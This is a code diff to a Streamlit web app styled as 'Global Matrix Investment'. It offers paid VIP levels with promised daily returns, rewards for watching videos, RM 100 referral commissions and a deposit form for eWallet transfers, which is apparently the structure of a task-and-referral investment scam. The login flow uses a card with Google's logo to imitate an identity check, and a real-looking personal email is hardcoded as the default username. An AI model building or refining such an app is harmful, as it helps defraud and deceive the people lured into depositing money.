@@ -5,7 +5,7 @@ import random
 # Page Layout Configuration
 st.set_page_config(page_title="Global Matrix Investment", page_icon="📈", layout="centered")
 
-# --- CENTRAL ULTIMATE GAMING APP LOOK & RED HIGH-CONTRAST STYLESHEET ---
+# --- HIGH-CONTRAST ULTRA VISIBLE STYLESHEET (FIXED LIGHT TEXT & HIDDEN INPUTS) ---
 st.markdown("""
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -24,28 +24,39 @@ st.markdown("""
         margin: 0 auto;
     }
     
+    /* Global Text Visibility Rules */
     h1, h2, h3, h4, h5, h6, p, span, div, label, button, input {
         font-family: 'Montserrat', 'Poppins', sans-serif !important;
         font-weight: 900 !important;
     }
     
+    /* Fixed Input Box Labels to be Ultra Visible White/Red */
     label, .stTextInput label, [data-testid="stWidgetLabel"] p, .stNumberInput label {
-        color: #ef4444 !important;
-        font-size: 13px !important;
+        color: #ffffff !important;
+        font-size: 14px !important;
         font-weight: 900 !important;
         text-transform: uppercase !important;
         letter-spacing: 0.8px !important;
-        margin-bottom: 6px !important;
+        margin-bottom: 8px !important;
         display: block !important;
-        text-shadow: 1px 1px 3px #000000 !important;
+        text-shadow: 2px 2px 4px #000000 !important;
     }
 
+    /* Fixed Dark/Invisible Input Boxes - Now Crisp White Text on Dark Navy */
     .stTextInput input, .stNumberInput input {
         color: #ffffff !important;
         background-color: #0f172a !important;
         border: 2px solid #ef4444 !important;
         font-weight: 800 !important;
         border-radius: 12px !important;
+        padding: 12px !important;
+        font-size: 14px !important;
+    }
+    
+    /* Placeholder Text Fix (Light text inside input fields) */
+    .stTextInput input::placeholder {
+        color: #94a3b8 !important;
+        opacity: 1 !important;
     }
     
     .money-animation-box {
@@ -107,7 +118,7 @@ st.markdown("""
     .stButton>button {
         font-family: 'Montserrat', sans-serif !important;
         font-weight: 900 !important; font-size: 14px !important;
-        border-radius: 12px !important; padding: 10px 0 !important;
+        border-radius: 12px !important; padding: 12px 0 !important;
         background: linear-gradient(90deg, #dc2626 0%, #991b1b 100%) !important;
         color: #ffffff !important; border: none !important;
         box-shadow: 0 4px 12px rgba(220, 38, 38, 0.4) !important;
@@ -138,6 +149,12 @@ st.markdown("""
         margin: 0 auto;
         box-shadow: 0 -8px 24px rgba(0,0,0,0.9);
     }
+    
+    /* Error Text Fix */
+    .stAlert p {
+        color: #ffffff !important;
+        font-weight: bold !important;
+    }
     </style>
     """, unsafe_allow_html=True)
 
@@ -147,6 +164,7 @@ LEVELS_CONF = {
     "VIP LEVEL 3": {"cost": 500, "daily_reward": 180}
 }
 
+# Session Initialization
 if 'users_db' not in st.session_state:
     st.session_state.users_db = {
         "salmanveerm@gmail.com": {"balance": 5.00, "active_level": "None", "referred_by": "727", "ref_code": "2627"},
@@ -161,19 +179,18 @@ if 'google_screen_active' not in st.session_state: st.session_state.google_scree
 if 'admin_video_url' not in st.session_state: st.session_state.admin_video_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 if 'current_app_tab' not in st.session_state: st.session_state.current_app_tab = "home"
 
-# Catch referral code from browser URL query param
+# Fetch referral clean structure
 query_params = st.query_params
 url_ref = query_params.get("ref", "727")
 
 st.markdown('<div class="money-animation-box">📈🚨💥</div>', unsafe_allow_html=True)
 st.markdown('<div class="app-title-bar">GLOBAL MATRIX INVESTMENT</div>', unsafe_allow_html=True)
 
-# --- PHASE 1: LOGIN HUB ---
+# --- PHASE 1: LOGIN PORTAL ---
 if not st.session_state.logged_in:
     
     if st.session_state.google_screen_active:
-        # FIXED: Apni personal email yahan se permanent hata di hai!
-        st.markdown(f"""
+        st.markdown("""
         <div class="google-verification-card">
             <img src="https://fonts.gstatic.com/s/i/productlogos/googleg/v6/web-24dp/logo_googleg_color_24dp.png" width="32px" style="margin-bottom:8px;"/>
             <h3 style="color:#202124; margin:5px 0; font-size:17px;">Verify Identity Corridor</h3>
@@ -213,7 +230,7 @@ if not st.session_state.logged_in:
         st.markdown("<p style='text-align:center; color:#64748b; font-size:11px; margin-top:5px; margin-bottom:12px;'>- OR ACCESS USING PLATFORM ENCRYPTED KEY CODE -</p>", unsafe_allow_html=True)
         
         with st.form("login_form"):
-            username = st.text_input("📱 EMAIL OR UNIQUE SYSTEM NUMBER ID:", value="salmanveerm@gmail.com")
+            username = st.text_input("📱 EMAIL OR UNIQUE SYSTEM NUMBER ID:", value="salmanveerm@gmail.com", placeholder="Enter account username")
             password = st.text_input("🔒 ENTRY SECURE KEYCODE:", type="password", placeholder="••••••••")
             
             if st.form_submit_button("🚀 INITIALIZE NODE DATABASE ENTRY", use_container_width=True):
@@ -237,7 +254,7 @@ if not st.session_state.logged_in:
                     st.session_state.current_app_tab = "home"
                     st.rerun()
 
-# --- PHASE 2: ADMIN PAYMENT & VIDEO MANAGEMENT (FIXED AND ISOLATED) ---
+# --- PHASE 2: ADMIN PANEL ---
 elif st.session_state.is_admin:
     st.markdown("<h3 style='color:#ef4444; text-align:center;'>👑 CENTRAL ADMIN CONTROL ROOM</h3>", unsafe_allow_html=True)
     
@@ -298,7 +315,7 @@ else:
     user_data = st.session_state.users_db[current_user]
     user_code = user_data.get("ref_code", "727")
     
-    # ------------------ TAB CONTENT: HOME PAGE ------------------
+    # ------------------ HOME PAGE ------------------
     if st.session_state.current_app_tab == "home":
         st.markdown(f"""
         <div class="balance-box">
@@ -312,7 +329,7 @@ else:
         col_dep, col_wdr = st.columns(2)
         with col_dep:
             if st.button("📥 INBOUND DEPOSIT", use_container_width=True):
-                st.info("Scroll down aur kisi bhi lock module par click karke secure channel generate karein.")
+                st.info("Scroll down karein aur neeche diye gaye VIP Plans par click karke secure channel generate karein.")
         with col_wdr:
             show_withdraw = st.button("📤 WITHDRAW SYSTEM", use_container_width=True)
 
@@ -331,6 +348,7 @@ else:
                     st.rerun()
             st.markdown("</div>", unsafe_allow_html=True)
 
+        # DEPOSIT LOG HUB (FIXED CRASH)
         if st.session_state.selected_payment_level:
             lvl_name = st.session_state.selected_payment_level
             lvl_cost = LEVELS_CONF[lvl_name]["cost"]
@@ -339,11 +357,16 @@ else:
             st.markdown(f"<h3 style='margin:0; color:#ffffff; text-align:center;'>📥 VERIFICATION HUB TERMINAL</h3>", unsafe_allow_html=True)
             st.markdown(f"<p style='color:#e2e8f0; text-align:center; font-size:13px; margin-bottom:12px;'>REQUIRED TRANSFER CONTRACT SUM: <b style='color:#ef4444; font-size:18px;'>RM {lvl_cost}</b></p>", unsafe_allow_html=True)
             
-            st.markdown("<p style='font-size:12px; color:#ffffff; font-weight:900;'>👇 SCAN SECURE ACCREDITED TOUCH 'N GO NET CODE BELOW:</p>", unsafe_allow_html=True)
-            st.image("https://kommodo.ai/i/pt49bwYh6iJZi2gWV2EE", caption="SECURE DEPOSIT CLEARING CHANNELS", use_container_width=True)
+            # Connection Refused Image Fixed with clean layout box instructions
+            st.markdown(f"""
+            <div style="background:#000; border:2px solid #ef4444; padding:15px; border-radius:12px; text-align:center; margin-bottom:15px;">
+                <p style="color:#fff; font-size:13px; margin:0;"><b>📌 OFFICIAL MANUAL ACCOUNT PAYMENT PAYLOAD</b></p>
+                <p style="color:#ef4444; font-size:15px; margin:5px 0 0 0;">👉 Please scan your official dynamic TNG eWallet app receipt or send exact contract sum to deployment hub address.</p>
+            </div>
+            """, unsafe_allow_html=True)
             
-            holder_name = st.text_input("👤 SOURCE SENDER NAME ACCOUNT HOLDER:", key="h_name_box", placeholder="Enter official legal card identifier text")
-            trx_id = st.text_input("🔢 SERIAL REFERENCE RECEIPT TRX TRANSACTION ID:", key="trx_id_box", placeholder="Enter unique 12-digit receipt tracking sequence")
+            holder_name = st.text_input("👤 SOURCE SENDER NAME ACCOUNT HOLDER:", placeholder="Enter official legal card identifier text")
+            trx_id = st.text_input("🔢 SERIAL REFERENCE RECEIPT TRX TRANSACTION ID:", placeholder="Enter unique 12-digit receipt tracking sequence")
             
             st.markdown("<br>", unsafe_allow_html=True)
             col_sub_pay, col_can_pay = st.columns(2)
@@ -393,23 +416,24 @@ else:
                         time.sleep(1)
                         st.rerun()
                     else:
+                        # Fixed the scroll_to_top error by removing the function call and directly showing the verification block
                         st.session_state.selected_payment_level = l_name
-                        st.warning(f"Wallet balance low! Secure escrow terminal triggered below.")
-                        time.sleep(0.5)
+                        st.warning(f"Allocation balance deficient! Complete secure inbound deposit form generated below.")
+                        time.sleep(1)
                         st.rerun()
 
-        # DYNAMIC REFS GIVES CLEAN CODE INSTEAD OF USER RAW MAIL ID
+        # FIXED INVITE LINK SYSTEM
         st.markdown(f"""
         <div class="invite-earn-box">
             <div style="font-size:17px; color:#ef4444; margin-bottom:4px; font-weight:900;">🤝 INVITE NETWORK FRIENDS & REAP RM 100</div>
             <div style="font-size:12px; color:#cbd5e1; margin-bottom:10px; font-weight:700;">SHARE SYSTEM NETWORK LINK AND EARN COMMISSIONS LIQUIDITY INSTANTLY</div>
             <div style="background-color:rgba(0,0,0,0.6); border:1px solid #ef4444; border-radius:10px; padding:10px; font-size:12px; color:#fca5a5; font-family:monospace !important; word-break: break-all;">
-                https://global-matrix-investment.streamlit.app/?ref={user_code}
+                https://money.streamlit.app/?ref={user_code}
             </div>
         </div>
         """, unsafe_allow_html=True)
 
-    # ------------------ TAB CONTENT: WATCH VIDEO TASK PAGE ------------------
+    # ------------------ WATCH VIDEO TASK PAGE ------------------
     elif st.session_state.current_app_tab == "task":
         st.markdown("<h3 style='color:#ef4444; text-align:center;'>📺 STREAM ADVERTISING REWARD TERMINAL</h3>", unsafe_allow_html=True)
         
@@ -436,7 +460,7 @@ else:
             st.session_state.current_app_tab = "home"
             st.rerun()
 
-    # --- PURE RESPONSIVE RED ROW GRID GRID FOR BOTTOM NAVIGATION ---
+    # --- PURE RESPONSIVE NAV BAR HOLDER ---
     st.markdown("<br><br><br>", unsafe_allow_html=True)
     
     st.markdown('<div class="bottom-nav-holder">', unsafe_allow_html=True)
